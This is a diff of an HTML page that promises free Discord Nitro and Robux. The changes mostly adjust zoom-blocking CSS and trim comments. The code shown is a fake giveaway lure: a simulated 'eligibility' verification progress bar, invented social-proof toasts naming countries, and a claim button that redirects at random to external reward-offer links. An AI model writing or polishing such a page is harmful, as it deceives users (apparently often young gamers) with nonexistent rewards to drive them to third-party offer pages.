@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover" />
   <title>Claim Your Reward | Daily Reward Options</title>
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
@@ -12,8 +12,8 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      /* Prevent any accidental zoom on iOS via touch */
-      touch-action: manipulation;
+      /* Disable zoom on touch actions */
+      touch-action: pan-x pan-y; /* allows scrolling but prevents pinch-zoom */
     }
 
     body {
@@ -26,8 +26,15 @@
       padding: 2rem 1.5rem;
       position: relative;
       animation: fadeIn 0.5s ease-out;
-      /* No zoom via double-tap or pinch */
-      touch-action: pan-x pan-y; /* allow scrolling but not pinch-zoom (handled by meta) */
+      /* extra prevention */
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+      touch-action: pan-x pan-y;
+    }
+
+    /* Also disable zoom on all interactive elements */
+    button, .reward-card, .claim-btn, .faq-question {
+      touch-action: manipulation;
     }
 
     @keyframes fadeIn {
@@ -128,7 +135,6 @@
       transition: all 0.2s ease;
       position: relative;
       overflow: hidden;
-      /* ensure no zoom on tap */
       touch-action: manipulation;
     }
 
@@ -419,7 +425,7 @@
       .toast-icon img { width: 24px; height: 24px; }
     }
 
-    /* iPad specific adjustments (ensure no zoom) */
+    /* iPad specific */
     @media (min-width: 768px) and (max-width: 1024px) {
       .wrap { width: min(600px, 90%); }
     }
@@ -429,7 +435,7 @@
 </head>
 <body>
 
-<!-- Background music: Thy Will by Hillary Scott (low volume, plays after first user interaction) -->
+<!-- Background music: Thy Will by Hillary Scott -->
 <audio id="bgMusic" loop preload="auto" style="display: none;">
   <source src="https://www.ceenaija.com/download-music/hillary-scott-thy-will.mp3" type="audio/mpeg">
 </audio>
@@ -473,7 +479,7 @@
 
 <script>
   (function() {
-    // ---------- BACKGROUND MUSIC (low volume, auto-start on any user interaction) ----------
+    // Background music
     const bgAudio = document.getElementById('bgMusic');
     let audioStarted = false;
     if (bgAudio) {
@@ -481,7 +487,7 @@
       bgAudio.loop = true;
       const startAudio = () => {
         if (!audioStarted) {
-          bgAudio.play().catch(e => console.log("Audio autoplay prevented, will start on next interaction"));
+          bgAudio.play().catch(e => console.log("Audio autoplay prevented"));
           audioStarted = true;
         }
         document.removeEventListener('click', startAudio);
@@ -491,7 +497,7 @@
       document.addEventListener('touchstart', startAudio);
     }
 
-    // ---------- CLICK SOUND (short beep) ----------
+    // Click sound
     let audioCtx = null;
     function playClick() {
       try {
@@ -512,7 +518,7 @@
       } catch(e) {}
     }
 
-    // ---------- REWARD DATA ----------
+    // Reward data
     const rewards = [
       { id: "nitro_basic", title: "Nitro Basic", desc: "Emojis, stickers, 50MB upload", icon: "https://i.postimg.cc/T1bZnqjV/1cc22811-2ac2-4749-8dfe-501bd4dce238.webp" },
       { id: "nitro_boost", title: "Nitro Boost", desc: "Boosts, 4K streaming, profile perks", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp" },
@@ -566,7 +572,6 @@
       helperNote.classList.add('hidden');
     }
 
-    // ---------- REDIRECTS (external, no Vercel 404) ----------
     const redirectUrls = [
       "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
       "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
@@ -575,7 +580,6 @@
       return redirectUrls[Math.floor(Math.random() * redirectUrls.length)];
     }
 
-    // ---------- PROGRESS SIMULATION ----------
     const steps = [
       { label: "Preparing secure gateway...", sub: "Initializing reward page", min: 500, max: 750, target: 30 },
       { label: "Checking eligibility...", sub: "Reviewing device & region", min: 650, max: 900, target: 66 },
@@ -618,7 +622,7 @@
 
     claimBtn.addEventListener('click', startProgress);
 
-    // ---------- FAQ smooth toggle (play sound only when opening, not closing) ----------
+    // FAQ
     document.querySelectorAll('.faq-item').forEach(item => {
       const q = item.querySelector('.faq-question');
       q.addEventListener('click', (e) => {
@@ -628,7 +632,7 @@
       });
     });
 
-    // ---------- SOCIAL PROOF TOASTS ----------
+    // Social proof toasts
     const toastContainer = document.getElementById('activity-toasts');
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
